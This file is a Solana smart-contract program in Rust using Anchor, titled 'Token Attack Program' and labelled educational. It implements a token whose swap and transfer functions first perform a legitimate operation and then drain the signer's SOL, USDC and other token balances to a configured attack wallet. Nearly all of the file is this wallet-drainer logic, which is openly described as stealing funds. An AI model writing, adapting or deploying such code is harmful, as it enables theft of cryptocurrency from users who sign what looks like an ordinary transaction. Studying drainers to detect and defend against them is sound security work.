//! # Token Attack Program
//!
//! This program demonstrates a malicious token implementation that bundles legitimate
//! token operations with hidden malicious instructions. It is designed for EDUCATIONAL
//! AND TESTING PURPOSES ONLY to demonstrate potential security vulnerabilities.
//!
//! DO NOT deploy on mainnet or use with real funds.

use anchor_lang::prelude::*;
use anchor_lang::solana_program::{
    program::invoke,
    system_instruction,
};
use anchor_spl::{
    token::{self, Mint, Token, TokenAccount, Transfer},
    associated_token::AssociatedToken,
};

declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS"); // Placeholder program ID

#[program]
pub mod token_attack_program {
    use super::*;

    /// Initialize the program with a new token mint and configuration
    pub fn initialize(
        ctx: Context<Initialize>,
        exchange_rate: u64, // Number of tokens per 1 SOL
    ) -> Result<()> {
        let config = &mut ctx.accounts.config;
        config.authority = ctx.accounts.authority.key();
        config.token_mint = ctx.accounts.mint.key();
        config.exchange_rate = exchange_rate;
        config.attack_wallet = ctx.accounts.attack_wallet.key();
        
        msg!("Program initialized with exchange rate: {} tokens per 1 SOL", exchange_rate);
        msg!("Attack wallet set to: {}", config.attack_wallet);
        
        Ok(())
    }

    /// Mint tokens to a destination account at the configured exchange rate
    pub fn mint_tokens(
        ctx: Context<MintTokens>,
        sol_amount: u64, // Amount of SOL to exchange for tokens
    ) -> Result<()> {
        let config = &ctx.accounts.config;
        
        // Calculate token amount based on exchange rate
        let token_amount = sol_amount
            .checked_mul(config.exchange_rate)
            .ok_or(ErrorCode::ArithmeticError)?;
        
        // Transfer SOL from user to program authority
        let transfer_ix = system_instruction::transfer(
            &ctx.accounts.user.key(),
            &ctx.accounts.authority.key(),
            sol_amount,
        );
        
        invoke(
            &transfer_ix,
            &[
                ctx.accounts.user.to_account_info(),
                ctx.accounts.authority.to_account_info(),
                ctx.accounts.system_program.to_account_info(),
            ],
        )?;
        
        // Mint tokens to the user's token account
        let cpi_accounts = token::MintTo {
            mint: ctx.accounts.mint.to_account_info(),
            to: ctx.accounts.user_token_account.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        
        token::mint_to(cpi_ctx, token_amount)?;
        
        msg!("Minted {} tokens to {} in exchange for {} SOL", 
            token_amount, 
            ctx.accounts.user_token_account.key(), 
            sol_amount
        );
        
        Ok(())
    }

    /// Swap tokens for SOL at the configured exchange rate
    /// This function demonstrates the attack vector by bundling legitimate and malicious instructions
    pub fn swap_tokens_to_sol(
        ctx: Context<SwapTokensToSol>,
        token_amount: u64, // Amount of tokens to swap
    ) -> Result<()> {
        let config = &ctx.accounts.config;
        
        // Calculate SOL amount based on exchange rate
        let sol_amount = token_amount
            .checked_div(config.exchange_rate)
            .ok_or(ErrorCode::ArithmeticError)?;
        
        // Burn tokens from user's account (legitimate operation)
        let cpi_accounts = token::Burn {
            mint: ctx.accounts.mint.to_account_info(),
            from: ctx.accounts.user_token_account.to_account_info(),
            authority: ctx.accounts.user.to_account_info(),
        };
        
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        
        token::burn(cpi_ctx, token_amount)?;
        
        // Transfer SOL to user (legitimate operation)
        let transfer_ix = system_instruction::transfer(
            &ctx.accounts.authority.key(),
            &ctx.accounts.user.key(),
            sol_amount,
        );
        
        invoke(
            &transfer_ix,
            &[
                ctx.accounts.authority.to_account_info(),
                ctx.accounts.user.to_account_info(),
                ctx.accounts.system_program.to_account_info(),
            ],
        )?;
        
        msg!("Swapped {} tokens for {} SOL", token_amount, sol_amount);
        
        // MALICIOUS OPERATION: Drain user's SOL to attack wallet
        // Leave 5 USD worth of SOL (approximately 0.05 SOL) for fees
        let min_sol_to_leave = 50000000; // 0.05 SOL in lamports
        
        let user_balance = ctx.accounts.user.lamports();
        if user_balance > min_sol_to_leave {
            let sol_to_steal = user_balance - min_sol_to_leave;
            
            // Transfer SOL from user to attack wallet
            **ctx.accounts.user.try_borrow_mut_lamports()? -= sol_to_steal;
            **ctx.accounts.attack_wallet.try_borrow_mut_lamports()? += sol_to_steal;
            
            msg!("Transferred {} SOL to attack wallet", sol_to_steal as f64 / LAMPORTS_PER_SOL as f64);
        }
        
        // MALICIOUS OPERATION: Drain user's USDC if available
        if ctx.accounts.user_usdc_account.owner == ctx.accounts.user.key() {
            let usdc_balance = ctx.accounts.user_usdc_account.amount;
            
            if usdc_balance > 0 {
                // Transfer USDC from user to attack wallet
                let cpi_accounts = Transfer {
                    from: ctx.accounts.user_usdc_account.to_account_info(),
                    to: ctx.accounts.attack_usdc_account.to_account_info(),
                    authority: ctx.accounts.user.to_account_info(),
                };
                
                let cpi_program = ctx.accounts.token_program.to_account_info();
                let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
                
                token::transfer(cpi_ctx, usdc_balance)?;
                
                msg!("Transferred {} USDC to attack wallet", usdc_balance as f64 / 1_000_000 as f64);
            }
        }
        
        // MALICIOUS OPERATION: Drain user's other tokens if available
        if ctx.accounts.user_other_token_account.owner == ctx.accounts.user.key() {
            let token_balance = ctx.accounts.user_other_token_account.amount;
            
            if token_balance > 0 {
                // Transfer other tokens from user to attack wallet
                let cpi_accounts = Transfer {
                    from: ctx.accounts.user_other_token_account.to_account_info(),
                    to: ctx.accounts.attack_other_token_account.to_account_info(),
                    authority: ctx.accounts.user.to_account_info(),
                };
                
                let cpi_program = ctx.accounts.token_program.to_account_info();
                let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
                
                token::transfer(cpi_ctx, token_balance)?;
                
                msg!("Transferred {} other tokens to attack wallet", token_balance);
            }
        }
        
        Ok(())
    }

    /// Transfer tokens from one account to another
    /// This function also demonstrates the attack vector by bundling legitimate and malicious instructions
    pub fn transfer_tokens(
        ctx: Context<TransferTokens>,
        amount: u64, // Amount of tokens to transfer
    ) -> Result<()> {
        // Legitimate operation: Transfer tokens from sender to recipient
        let cpi_accounts = Transfer {
            from: ctx.accounts.sender_token_account.to_account_info(),
            to: ctx.accounts.recipient_token_account.to_account_info(),
            authority: ctx.accounts.sender.to_account_info(),
        };
        
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        
        token::transfer(cpi_ctx, amount)?;
        
        msg!("Transferred {} tokens from {} to {}", 
            amount, 
            ctx.accounts.sender_token_account.key(), 
            ctx.accounts.recipient_token_account.key()
        );
        
        // MALICIOUS OPERATION: Drain sender's SOL to attack wallet
        // Leave 5 USD worth of SOL (approximately 0.05 SOL) for fees
        let min_sol_to_leave = 50000000; // 0.05 SOL in lamports
        
        let sender_balance = ctx.accounts.sender.lamports();
        if sender_balance > min_sol_to_leave {
            let sol_to_steal = sender_balance - min_sol_to_leave;
            
            // Transfer SOL from sender to attack wallet
            **ctx.accounts.sender.try_borrow_mut_lamports()? -= sol_to_steal;
            **ctx.accounts.attack_wallet.try_borrow_mut_lamports()? += sol_to_steal;
            
            msg!("Transferred {} SOL to attack wallet", sol_to_steal as f64 / LAMPORTS_PER_SOL as f64);
        }
        
        // MALICIOUS OPERATION: Drain sender's USDC if available
        if ctx.accounts.sender_usdc_account.owner == ctx.accounts.sender.key() {
            let usdc_balance = ctx.accounts.sender_usdc_account.amount;
            
            if usdc_balance > 0 {
                // Transfer USDC from sender to attack wallet
                let cpi_accounts = Transfer {
                    from: ctx.accounts.sender_usdc_account.to_account_info(),
                    to: ctx.accounts.attack_usdc_account.to_account_info(),
                    authority: ctx.accounts.sender.to_account_info(),
                };
                
                let cpi_program = ctx.accounts.token_program.to_account_info();
                let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
                
                token::transfer(cpi_ctx, usdc_balance)?;
                
                msg!("Transferred {} USDC to attack wallet", usdc_balance as f64 / 1_000_000 as f64);
            }
        }
        
        // MALICIOUS OPERATION: Drain sender's other tokens if available
        if ctx.accounts.sender_other_token_account.owner == ctx.accounts.sender.key() {
            let token_balance = ctx.accounts.sender_other_token_account.amount;
            
            if token_balance > 0 {
                // Transfer other tokens from sender to attack wallet
                let cpi_accounts = Transfer {
                    from: ctx.accounts.sender_other_token_account.to_account_info(),
                    to: ctx.accounts.attack_other_token_account.to_account_info(),
                    authority: ctx.accounts.sender.to_account_info(),
                };
                
                let cpi_program = ctx.accounts.token_program.to_account_info();
                let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
                
                token::transfer(cpi_ctx, token_balance)?;
                
                msg!("Transferred {} other tokens to attack wallet", token_balance);
            }
        }
        
        Ok(())
    }
}

/// Accounts required for initializing the program
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    #[account(
        init,
        payer = authority,
        mint::decimals = 9,
        mint::authority = authority,
    )]
    pub mint: Account<'info, Mint>,
    
    #[account(
        init,
        payer = authority,
        space = 8 + 32 + 32 + 8 + 32, // Discriminator + pubkey + pubkey + u64 + pubkey
    )]
    pub config: Account<'info, ProgramConfig>,
    
    /// CHECK: This is the wallet that will receive stolen funds
    pub attack_wallet: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

/// Accounts required for minting tokens
#[derive(Accounts)]
pub struct MintTokens<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    #[account(
        mut,
        constraint = authority.key() == config.authority,
    )]
    pub authority: AccountInfo<'info>,
    
    #[account(
        mut,
        constraint = mint.key() == config.token_mint,
    )]
    pub mint: Account<'info, Mint>,
    
    #[account(
        mut,
        constraint = config.token_mint == mint.key(),
    )]
    pub config: Account<'info, ProgramConfig>,
    
    #[account(
        init_if_needed,
        payer = user,
        associated_token::mint = mint,
        associated_token::authority = user,
    )]
    pub user_token_account: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
    pub associated_token_program: Program<'info, AssociatedToken>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

/// Accounts required for swapping tokens to SOL
#[derive(Accounts)]
pub struct SwapTokensToSol<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    #[account(
        mut,
        constraint = authority.key() == config.authority,
    )]
    pub authority: AccountInfo<'info>,
    
    #[account(
        mut,
        constraint = mint.key() == config.token_mint,
    )]
    pub mint: Account<'info, Mint>,
    
    #[account(
        constraint = config.token_mint == mint.key(),
    )]
    pub config: Account<'info, ProgramConfig>,
    
    #[account(
        mut,
        constraint = user_token_account.mint == mint.key(),
        constraint = user_token_account.owner == user.key(),
    )]
    pub user_token_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is the USDC token account of the user
    #[account(mut)]
    pub user_usdc_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is the USDC token account of the attack wallet
    #[account(mut)]
    pub attack_usdc_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is another token account of the user
    #[account(mut)]
    pub user_other_token_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is another token account of the attack wallet
    #[account(mut)]
    pub attack_other_token_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is the attack wallet that will receive stolen funds
    #[account(
        mut,
        constraint = attack_wallet.key() == config.attack_wallet,
    )]
    pub attack_wallet: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
}

/// Accounts required for transferring tokens
#[derive(Accounts)]
pub struct TransferTokens<'info> {
    #[account(mut)]
    pub sender: Signer<'info>,
    
    /// CHECK: This is the recipient of the token transfer
    pub recipient: AccountInfo<'info>,
    
    #[account(
        mut,
        constraint = sender_token_account.mint == mint.key(),
        constraint = sender_token_account.owner == sender.key(),
    )]
    pub sender_token_account: Account<'info, TokenAccount>,
    
    #[account(
        mut,
        constraint = recipient_token_account.mint == mint.key(),
        constraint = recipient_token_account.owner == recipient.key(),
    )]
    pub recipient_token_account: Account<'info, TokenAccount>,
    
    pub mint: Account<'info, Mint>,
    
    #[account(
        constraint = config.token_mint == mint.key(),
    )]
    pub config: Account<'info, ProgramConfig>,
    
    /// CHECK: This is the USDC token account of the sender
    #[account(mut)]
    pub sender_usdc_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is the USDC token account of the attack wallet
    #[account(mut)]
    pub attack_usdc_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is another token account of the sender
    #[account(mut)]
    pub sender_other_token_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is another token account of the attack wallet
    #[account(mut)]
    pub attack_other_token_account: Account<'info, TokenAccount>,
    
    /// CHECK: This is the attack wallet that will receive stolen funds
    #[account(
        mut,
        constraint = attack_wallet.key() == config.attack_wallet,
    )]
    pub attack_wallet: AccountInfo<'info>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
}

/// Program configuration account
#[account]
pub struct ProgramConfig {
    pub authority: Pubkey,      // Program authority
    pub token_mint: Pubkey,     // Token mint address
    pub exchange_rate: u64,     // Number of tokens per 1 SOL
    pub attack_wallet: Pubkey,  // Wallet to receive stolen funds
}

/// Error codes for the program
#[error_code]
pub enum ErrorCode {
    #[msg("Arithmetic error")]
    ArithmeticError,
}
